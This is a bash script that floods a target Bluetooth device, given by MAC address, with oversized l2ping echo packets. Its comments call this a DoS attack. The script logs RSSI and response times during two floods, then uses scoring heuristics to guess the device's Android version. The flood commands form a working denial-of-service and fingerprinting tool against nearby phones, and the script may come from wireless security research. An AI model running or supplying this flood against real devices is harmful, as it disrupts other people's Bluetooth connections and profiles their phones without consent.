#!/bin/bash

# Check if MAC address is provided as command line argument
if [ -z "$1" ]; then
    echo "Usage: sudo bash final.sh <MAC>"
    exit 1
fi

# Define the device address from command line argument and output file for RSSI values
device_address="$1"
output_file_rssi="Normal_RSSI.txt"
packet_size=640

# Clear the output file for RSSI values
echo "" > "$output_file_rssi"
counter=0

echo "Collecting initial RSSI for 60 seconds..."
end=$((SECONDS+60))
while [ $SECONDS -lt $end ]; do
    ((counter++))
    rssi=$(hcitool rssi $device_address | awk '{print $NF}')
    echo "$counter $rssi" >> "$output_file_rssi"
    sleep 1
done

# Calculate the mean of RSSI values
Mean_RSSI=$(awk '{total += $2; count++} END {if (count > 0) print total/count}' "$output_file_rssi")

# Prepare for DoS attack
cmd="sudo l2ping -i hci0 -s $packet_size -f $device_address"
output_file="Attack_RSSI.txt"
echo "" > "$output_file"
counter=0

# Function to collect RSSI during the attack
collect_rssi() {
    local duration=$1
    local end=$((SECONDS+duration))
    while [ $SECONDS -lt $end ]; do
        ((counter++))
        rssi=$(hcitool rssi $device_address | awk '{print $NF}')
        echo "$counter $rssi" >> "$output_file"
        sleep 1
    done
}

# Collect RSSI before, during, and after DoS attack
collect_rssi 10  # Before attack
echo "Starting DoS attack and measuring RSSI..."
$cmd &  # Start DoS attack in the background
pid=$!
collect_rssi 50  # During attack
kill $pid
echo ""
echo "DoS attack stopped."
collect_rssi 10  # After attack

sleep 3

# Calculate mean RSSI during the attack
Mean_RSSI_Attack=$(awk '{total += $2; count++} END {if (count > 0) print total/count}' "$output_file")

# Calculate mean difference, ensuring it is always positive
Mean_difference=$(echo "$Mean_RSSI - $Mean_RSSI_Attack" | bc)
Mean_difference=$(echo "if ($Mean_difference < 0) $Mean_difference * -1 else $Mean_difference" | bc)

# Disconnect from the device
echo "Disconnecting from the device..."
sudo hcitool dc "$device_address"
echo ""

sleep 5

# Run l2ping command and calculate responses and max response
echo "Running l2ping command..."
output_file_ping="Response_Time.txt"
echo "" > "$output_file_ping"
counter=1
sudo l2ping -c 3000 -s 640 "$device_address" -f | while read -r line; do
    if [[ "$line" =~ time\ ([0-9]+\.[0-9]+)ms ]]; then
        time_ms="${BASH_REMATCH[1]}"
        echo "$counter $time_ms" >> "$output_file_ping"
        ((counter++))
    fi
done

echo ""

No_of_responses=$(wc -l < "$output_file_ping")
Max_Response=$(awk '{print $2}' "$output_file_ping" | sort -n | tail -1)
response_perc=$(echo "scale=2; ($No_of_responses / 3000) * 100" | bc)

echo "Mean_difference: $Mean_difference"
echo ""
echo "response_perc: $response_perc"
echo ""
echo "Max_response: $Max_Response"
echo ""


evaluate_android_older_version() {
    local response_perc=$1
    local max_response=$2
    local mean_diff=$3

    if (( $(echo "$response_perc == 100" | bc -l) )); then
        local score_8=$(echo "((($max_response < 900) && ($max_response >= 800)) * 0.30) + ((($mean_diff >= 2.5) && ($mean_diff <= 3))* 0.70)" | bc)
        local score_9=$(echo "((($max_response < 800) && ($max_response >= 700)) * 0.30) + ((($mean_diff > 2) && ($mean_diff <= 2.5))* 0.70)" | bc)
        local score_5=$(echo "((($max_response < 1000) && ($max_response >= 900)) * 0.30) + ((($mean_diff > 1) && ($mean_diff < 1.5))* 0.70)" | bc)

        local max_score=$(echo "$score_8 $score_9 $score_5" | tr ' ' '\n' | sort -nr | head -n1)

        if (( $(echo "$max_score == $score_8" | bc) )); then
            echo "8"
        elif (( $(echo "$max_score == $score_9" | bc) )); then
            echo "9"
        elif (( $(echo "$max_score == $score_5" | bc) )); then
            echo "5"
        else
            echo "Unable to determine the Android version"
        fi
    else
        local score_11=$(echo "((($response_perc <= 35) && ($response_perc > 25)) * 0.15) + ((($max_response < 200) && ($max_response >= 150)) * 0.15) + ((($mean_diff < 2) && ($mean_diff >= 1.5)) * 0.70)" | bc)
        local score_10=$(echo "((($response_perc <= 45) && ($response_perc > 35)) * 0.15) + ((($max_response < 190) && ($max_response >= 120)) * 0.15) + ((($mean_diff > 2.5) && ($mean_diff <= 3)) * 0.70)" | bc)

        local max_score=$(echo "$score_11 $score_10" | tr ' ' '\n' | sort -nr | head -n1)

        if (( $(echo "$max_score == $score_11" | bc) )); then
            echo "11"
        elif (( $(echo "$max_score == $score_10" | bc) )); then
            echo "10"
        else
            echo "Unable to determine the Android version"
        fi
    fi
}


evaluate_android_newer_version() {
    local response_perc=$1
    local max_response=$2
    local mean_diff=$3

    local score_14=$(echo "(($response_perc <= 12) * 0.45) + (($max_response < 150) * 0.45) + (($mean_diff < 0.5) * 0.1)" | bc)
    local score_13=$(echo "((($response_perc <= 20) && ($response_perc > 10)) * 0.45) + ((($max_response < 90) && ($max_response >= 75)) * 0.45) + ((($mean_diff > 2) && ($mean_diff <= 2.5)) * 0.1)" | bc)
    local score_12=$(echo "((($response_perc > 35) && ($response_perc <= 45)) * 0.45) + ((($max_response < 110) && ($max_response >= 95)) * 0.45) + ((($mean_diff > 0.5) && ($mean_diff <= 1)) * 0.1)" | bc)
    
    echo "And 14: $score_14" 
    echo ""
    echo "And 13: $score_13"
    echo ""
    echo "And 12: $score_12"
    echo ""

    local max_score=$(echo "$score_14 $score_13 $score_12" | tr ' ' '\n' | sort -nr | head -n1)

    if (( $(echo "$max_score == $score_14" | bc) )); then
        echo "14"
    elif (( $(echo "$max_score == $score_13" | bc) )); then
        echo "13"
    elif (( $(echo "$max_score == $score_12" | bc) )); then
        echo "12"
    else
        echo "Unable to determine the Android version"
    fi
}

echo ""

echo_check_output=$(sudo l2ping $device_address -r)
if echo "$echo_check_output" | grep -q "Peer doesn't support Echo packets"; then
    echo "Peer doesn't support Echo packets, evaluating as newer Android version..."
    evaluate_android_newer_version $response_perc $Max_Response $Mean_difference
else
    echo "Peer supports Echo packets, evaluating as older Android version..."
    evaluate_android_older_version $response_perc $Max_Response $Mean_difference
fi
# Evaluate the Android version
# evaluate_android_version $response_perc $Max_Response $Mean_difference

